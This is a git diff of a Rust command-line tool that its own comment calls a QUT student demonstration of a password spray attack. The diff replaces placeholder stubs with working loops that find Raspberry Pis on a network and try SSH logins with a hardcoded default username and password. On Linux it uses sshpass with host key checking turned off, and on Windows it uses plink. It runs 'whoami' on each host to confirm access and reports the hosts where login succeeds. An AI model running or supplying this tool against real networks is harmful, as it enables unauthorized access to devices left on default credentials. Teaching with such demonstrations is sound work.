@@ -1,7 +1,10 @@
 use clap::Parser;
 use std::process::{Command,Stdio};
-use regex::Regex;
 use colored::*;
+use std::io::Write;
+
+static DEFAULT_USERNAME: &str = "pi";
+static DEFAULT_PASSWORD: &str = "186068";
 
 #[derive(Parser)]
 ///Search a network for raspberry PI's and try default credentials with an ssh connection. This is a QUT student demonstration of a password spray attack. 
@@ -88,25 +91,54 @@ fn get_ips(network_range: String) -> Vec<String> {
 
 #[cfg(target_os = "linux")]
 fn spray(ips: Vec<String>) {
-    println!("efjeiwafjew");
+    for ip in ips {
+        print!("[{}] {}\r", "~".truecolor(169,169,169), ip);
+        let ssh = Command::new("sshpass")
+                      .arg("-p")
+                      .arg(DEFAULT_PASSWORD)
+                      .arg("ssh")
+                      .arg("-o")
+                      .arg("StrictHostKeyChecking no")
+                      .arg(format!("{}@{}", DEFAULT_USERNAME,  ip))
+                      .arg("whoami")
+                      .output()
+                      .expect("Tried to run 'sshpass -p DEFAULT_PASSWORD ssh -o 'StrictHostKeyChecking no' DEFAULT_USERNAME@IP whoami' but failed.");
+        
+        let ssh_output = String::from_utf8_lossy(&ssh.stdout);
+        if (ssh_output.contains(DEFAULT_USERNAME)){
+            println!("[{}] {}", "+".bright_green(), ip);
+        } else {
+            println!("[{}] {}", "-".bright_red(), ip);
+        }
+    }
 }
 
 #[cfg(target_os = "windows")]
 fn spray(ips: Vec<String>) {
-    //UNFINISHED
-    //putty.exe -ssh root@somewhere.com -pw mypasswordforsomewherecom
-    let ssh = Command::new("putty")
-                      .arg("-ssh")
-                      .arg("-shhlog")
-                      .arg(format!("pi@{}", "ip.ip.ip.ip"))
-                      .arg("-pw")
-                      .arg("raspberry")
-                      .output()
-                      .expect("ssh failed to start");
+    
+    let mut file = std::fs::File::create("whoami.txt").expect("Failed to file for splink");
+    file.write_all("whoami".as_bytes()).expect("Failed to write to file for splink");
 
-    //NEED TO CREATE A PUTTY LOG FILE, READ IT, CHECK IF THE CONNECTION WAS SUCCESSFUL OR NOT. THEN TERMINATE THE PUTTY SESSION.
-    println!("{:?}", ssh.stdout);
-    println!("Successful SSH ? : {:?}", ssh.status.success());
+    for ip in ips {
+        print!("[{}] {}\r", "~".truecolor(169,169,169), ip);
+        let ssh = Command::new("plink")
+                        .arg("-ssh")
+                        .arg(format!("{}@{}", DEFAULT_USERNAME, ip))
+                        .arg("-pw")
+                        .arg(DEFAULT_PASSWORD)
+                        .arg("-m")
+                        .arg("whoami.txt")
+                        .output()
+                        .expect("ssh failed to start");
+        let ssh_output = String::from_utf8_lossy(&ssh.stdout);
+        if (ssh_output.contains(DEFAULT_USERNAME)){
+            println!("[{}] {}", "+".bright_green(), ip);
+        } else {
+            println!("[{}] {}", "-".bright_red(), ip);
+        }
+    }
+
+    std::fs::remove_file("whoami.txt").expect("Failed to delete file used for splink. Please delete it from your directory.");
 }
 
 fn main() {
@@ -114,11 +146,6 @@ fn main() {
     let args = Cli::parse();
     let ips = get_ips(args.network_range);
     spray(ips);
-    
-    
-    //println!("{:?}", ips);
-
-    //println!("{:?}", &nmap_output);    //"'/B8:27:EB|28:CD:C1|DC:A6:32|E4:5F:01/{print;getline;print;}'")
 
 }
 
